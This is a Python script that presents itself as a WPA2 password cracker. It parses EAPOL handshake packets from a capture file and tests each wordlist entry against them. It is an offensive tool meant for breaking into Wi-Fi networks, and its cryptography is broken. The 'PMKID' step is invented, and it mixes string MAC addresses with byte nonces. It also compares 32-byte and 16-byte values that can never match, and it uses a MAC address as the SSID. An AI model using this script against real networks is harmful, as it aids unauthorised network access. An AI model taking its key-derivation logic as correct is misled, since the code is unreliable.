import sys
import hashlib
from scapy.all import rdpcap, EAPOL, Dot11

def parse_handshake(file):
    packets = rdpcap(file)
    handshake_packets = []
    
    # Extract EAPOL packets (which contain the handshake)
    for packet in packets:
        if packet.haslayer(EAPOL):
            handshake_packets.append(packet)
    
    print(f"Number of EAPOL packets found: {len(handshake_packets)}")  # Debugging line
    return handshake_packets


def derive_key(password, ssid):
    # Create the PMK using PBKDF2
    pmk = hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, dklen=32)
    return pmk

def extract_nonce_and_macs(handshake):
    if len(handshake) < 2:
        return None, None, None  # Not enough packets for nonce extraction

    # Extracting AP and Client MACs
    ap_mac = handshake[0].addr2  # AP MAC is in the second packet of the handshake
    client_mac = handshake[0].addr1  # Client MAC is in the first packet of the handshake

    # Extracting nonces from EAPOL packets
    nonce1 = handshake[0].EAPOL.key_nonce  # The nonce from the first EAPOL packet
    nonce2 = handshake[1].EAPOL.key_nonce  # The nonce from the second EAPOL packet

    return ap_mac, client_mac, nonce1 + nonce2

def mac_str_to_bytes(mac_str):
    """Convert a MAC address string to a bytes object."""
    return bytes.fromhex(mac_str.replace(':', ''))

def extract_pmkid_from_handshake(handshake):
    ap_mac, client_mac, nonces = extract_nonce_and_macs(handshake)
    
    if ap_mac is None or client_mac is None:
        return None  # Not enough data to extract PMKID

    # Combine MAC addresses and nonces for PMKID
    pmkid_input = ap_mac + client_mac + nonces
    pmkid = hashlib.pbkdf2_hmac('sha1', pmkid_input, b'WPA', 4096, dklen=16)

    print(f"Extracted PMKID: {pmkid.hex()}")  # Debugging line
    return pmkid


def compare_with_handshake(pmk, handshake):
    pmkid = extract_pmkid_from_handshake(handshake)
    if pmkid is None:
        return False  # No valid PMKID found

    # Compare the derived PMKID with the extracted PMKID
    return pmk == pmkid



def crack_wpa2(handshake, wordlist, ssid):
    for password in wordlist:
        pmk = derive_key(password, ssid)
        if compare_with_handshake(pmk, handshake):
            return password
    return None

if __name__ == "__main__":
    capture_file = "../logs/log-01.cap"  # Example capture file path
    wordlist_file = "passlist.txt"  # Path to the password list
    ssid = "50:B0:19:AE:21:EF"  # The SSID used in the handshake
    
    # Load the wordlist
    with open(wordlist_file, 'r') as f:
        wordlist = f.read().splitlines()

    # Parse the handshake
    handshake = parse_handshake(capture_file)
    
    # Crack the password
    password = crack_wpa2(handshake, wordlist, ssid)
    
    if password:
        print(f"Password found: {password}")
    else:
        print("Password not found.")
